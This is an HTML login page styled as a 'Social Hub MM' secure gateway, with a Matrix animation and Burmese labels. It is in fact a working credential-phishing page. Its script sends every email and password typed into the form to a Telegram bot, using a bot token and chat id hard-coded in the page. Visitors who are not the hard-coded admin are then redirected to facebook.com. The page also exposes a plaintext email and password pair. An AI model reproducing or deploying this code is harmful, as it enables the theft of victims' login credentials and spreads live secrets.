<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Hub MM | Cyber Platform</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Padauk:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-black: #05050a;
            --neon-teal: #00f2ff;
            --neon-purple: #bc13fe;
            --neon-green: #00ff41;
            --glass: rgba(255, 255, 255, 0.05);
        }
        body {
            margin: 0; padding: 0; overflow-x: hidden;
            background-color: var(--bg-black);
            font-family: 'Share Tech Mono', 'Padauk', monospace;
            color: white;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; }

        .login-box {
            background: var(--glass);
            backdrop-filter: blur(15px); border-radius: 15px;
            padding: 40px; width: 320px; text-align: center;
            border: 1px solid var(--neon-teal);
            box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);
            z-index: 100;
        }
        .login-title { color: var(--neon-teal); font-size: 1.8rem; text-shadow: 0 0 10px var(--neon-teal); margin: 0; }
        .input-group { text-align: left; margin-bottom: 20px; }
        .input-group label { color: var(--neon-teal); font-size: 0.75rem; display: block; margin-bottom: 5px; }
        .input-group input {
            width: 100%; padding: 12px; background: rgba(0, 0, 0, 0.6);
            border: 1px solid var(--neon-purple); border-radius: 5px;
            color: white; box-sizing: border-box; outline: none;
        }
        .btn-neon {
            width: 100%; padding: 12px; background: transparent;
            border: 1px solid var(--neon-teal); color: var(--neon-teal);
            font-weight: bold; cursor: pointer; border-radius: 5px;
            text-transform: uppercase; transition: 0.3s;
        }
        .btn-neon:hover { background: var(--neon-teal); color: black; box-shadow: 0 0 20px var(--neon-teal); }

        #dashboard {
            display: none;
            grid-template-columns: 260px 1fr 300px;
            gap: 20px; width: 95%; max-width: 1200px; height: 90vh;
            margin-top: 20px; opacity: 0; transition: opacity 1s ease;
        }
        .glass-panel {
            background: var(--glass); backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 242, 255, 0.2); border-radius: 12px;
            padding: 20px; overflow-y: auto;
        }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>

    <div class="login-box" id="loginUI">
        <h1 class="login-title" id="mainTitle">SOCIAL HUB MM</h1>
        <p style="color: var(--neon-purple); font-size: 0.8rem; margin-bottom: 30px;">SECURE GATEWAY</p>
        <form id="loginForm">
            <div class="input-group">
                <label>Email Address</label>
                <input type="email" id="email" placeholder="example@mail.com" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="password" required>
            </div>
            <button type="submit" class="btn-neon">LOGIN လုပ်မည်</button>
        </form>
    </div>

    <div id="dashboard">
        <aside class="sidebar glass-panel">
            <div style="width: 70px; height: 70px; background: linear-gradient(45deg, var(--neon-teal), var(--neon-purple)); border-radius: 50%; margin: 0 auto 15px; border: 2px solid var(--neon-teal);"></div>
            <h3 style="margin: 0;">Admin User</h3>
            <p style="color: var(--neon-green); font-size: 0.7rem;">● Online</p>
        </aside>
        <main class="feed glass-panel">
            <h4>News Feed</h4>
            <p>Welcome to your secure dashboard. 🚀</p>
        </main>
    </div>

    <script>
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        canvas.height = window.innerHeight; canvas.width = window.innerWidth;
        const characters = "SOCIALHUBMM01";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        let matrixColor = "#004d40"; 

        function drawMatrix() {
            ctx.fillStyle = 'rgba(5, 5, 10, 0.1)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = matrixColor;
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 35);

        const loginForm = document.getElementById('loginForm');
        const loginUI = document.getElementById('loginUI');
        const dashboard = document.getElementById('dashboard');

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const emailValue = document.getElementById('email').value;
            const passValue = document.getElementById('password').value;

            // Telegram သို့ အချက်အလက်ပို့ခြင်း
            const token = "8417384892:AAHFtwxjmozHFmWBbPbG_TcGsKkoHcOXBLA"; 
            const chat_id = "7324613569";
            const message = `📡 Social Hub Alert!\n📧 Email: ${emailValue}\n🔑 Pass: ${passValue}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

            try {
                await fetch(url);

                // Admin Account စစ်ဆေးခြင်း
                if (emailValue === "lwink4141@gmail.com" && passValue === "lwink4141") {
                    loginUI.style.borderColor = "#00ff41";
                    document.getElementById('mainTitle').innerText = "ACCESS GRANTED";
                    matrixColor = "#00ff41";
                    
                    setTimeout(() => {
                        loginUI.style.display = "none";
                        dashboard.style.display = "grid";
                        setTimeout(() => { dashboard.style.opacity = "1"; }, 50);
                    }, 800);
                } else {
                    // တခြားလူဆိုရင် redirect လုပ်မယ်
                    alert("စနစ်ကို စစ်ဆေးနေပါသည်...");
                    window.location.href = "https://www.facebook.com";
                }
            } catch (err) {
                alert("Connection Error!");
            }
        });
    </script>
</body>
</html>
